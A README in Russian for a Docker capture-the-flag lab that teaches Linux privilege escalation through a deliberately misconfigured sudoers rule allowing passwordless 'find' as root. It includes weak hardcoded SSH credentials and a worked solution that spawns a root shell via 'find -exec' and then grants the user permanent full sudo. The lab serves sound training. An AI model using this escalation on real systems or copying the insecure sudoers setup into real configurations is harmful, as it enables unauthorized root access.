# Privilege Escalation CTF: sudo + find

Простой стенд для тренировки повышения привилегий в Linux через неверно настроенный `sudoers`.

## Что внутри

- Контейнер с SSH-сервером.
- Пользователь `john` без полных прав `root`.
- Известные учетные данные пользователя `john`.
- Пользователь `root`, пароль которого неизвестен и вход по SSH запрещен.
- Ошибочная настройка `sudoers`: пользователь `john` может запускать `/usr/bin/find` от имени `root` без пароля.

## Структура

```text
.
├── challenge
│   ├── Dockerfile
│   ├── john-find-sudoers
│   └── sshd_config
├── docker-compose.yml
└── README.md
```

## Запуск

Требования:

- Docker
- Docker Compose

Запуск стенда:

```bash
docker compose up --build -d
```

Проверка:

```bash
docker compose ps
```

Подключение к стенду:

```bash
ssh john@localhost -p 2002
```

Пароль:

```text
pass
```

Остановка стенда:

```bash
docker compose down
```

## Задание

Нужно:

1. Подключиться по SSH на порт `2002`.
2. Войти под пользователем `john` с паролем `pass`.
3. Повысить привилегии до `root`.
4. Выдать пользователю `john` полноценные права `sudo`.

Формулировка для участников:

```text
Подключиться по ssh к порту 2002 под пользователем john и паролем pass,
повысить привилегии через root, выдать john права sudo.
```

## Подсказка для организатора

После входа можно проверить доступные команды:

```bash
sudo -l
```

Уязвимость позволяет использовать `find` для получения root-shell.

## Пример решения

После подключения:

```bash
sudo find / -exec /bin/sh -p \; -quit
```

Проверка, что shell уже root:

```bash
id
```

Выдача пользователю `john` полных прав `sudo`:

```bash
echo 'john ALL=(ALL:ALL) ALL' > /etc/sudoers.d/john-full
chmod 440 /etc/sudoers.d/john-full
```

Проверка:

```bash
exit
sudo -l
sudo whoami
```

Ожидаемый результат:

```text
root
```
